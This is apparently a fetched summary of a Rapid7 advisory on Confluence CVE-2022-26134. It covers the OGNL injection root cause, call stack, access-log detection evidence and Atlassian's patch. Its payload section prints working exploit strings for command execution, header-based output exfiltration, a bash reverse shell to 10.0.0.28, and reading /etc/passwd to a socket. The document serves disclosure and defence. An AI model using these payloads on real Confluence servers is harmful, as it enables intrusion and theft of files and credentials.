# Active Exploitation of Confluence CVE-2022-26134

**Source URL:** https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/
**CVE:** CVE-2022-26134
**Fetched:** 2026-05-18
**Source type:** blog

---

## Vulnerability Description
CVE-2022-26134 is "an unauthenticated and remote OGNL injection vulnerability resulting in code execution in the context of the Confluence server." It affects Confluence Server and Confluence Data Center, with "all versions" likely vulnerable across supported and unsupported releases.

## Exploitation Mechanism
The vulnerability exploits how Confluence processes HTTP requests. The attack vector involves placing OGNL payloads in the URI of HTTP requests. "Any type of HTTP method appears to work, whether valid (GET, POST, PUT, etc) or invalid (e.g. 'BALH')."

The root cause traces through a call stack where the servlet processes URIs, converts them to namespaces via `getNamespaceFromServletPath`, and then passes them to `TextParseUtil.translateVariables()`, which invokes `OgnlValueStack.findValue()` for OGNL evaluation.

## Sample OGNL Payloads

**Basic command execution:**
```
${@java.lang.Runtime@getRuntime().exec("touch /tmp/r7")}
```

**Command output exfiltration via header:**
```
${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime()
.exec("whoami").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext
@getResponse().setHeader("X-Cmd-Response",#a))}
```

**Reverse shell via Nashorn JavaScript engine:**
```
${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder()
.command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}
```

**In-memory file exfiltration:**
```
${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("var data = new java.lang.String
(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get('/etc/passwd')));var sock = new java.net.Socket
('10.0.0.28', 1270); var output = new java.io.BufferedWriter(new java.io.OutputStreamWriter(sock
.getOutputStream())); output.write(data); output.flush(); sock.close();")}
```

## Affected Code Path
The call stack shows the vulnerability flows through:
- `HttpServlet.service()` → `ServletDispatcher.service()` → `ConfluenceServletDispatcher.serviceAction()` → `DefaultActionProxy.execute()` → `ActionChainResult.execute()` → `TextParseUtil.translateVariables()` → `OgnlValueStack.findValue()` → `SimpleNode.evaluateGetValueBody()` → `Ognl.getValue()`

## Detection Evidence
Access logs contain URL-encoded payloads. Example from Confluence 7.13.6 LTS:
```
[02/Jun/2022:16:02:13 -0700] - http-nio-8090-exec-10 10.0.0.28 GET 
/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22touch%20/tmp/r7%22%29%7D/ 
HTTP/1.1 302 20ms
```

## Patch Details
Atlassian replaced `xwork-1.0.3.6.jar` with `xwork-1.0.3-atlassian-10.jar`. The patch removes namespace translation through `TextParseUtil.translateVariables()` and introduces `SafeExpressionUtil` class to filter unsafe OGNL expressions before `OgnlValueStack.findValue()` evaluation.
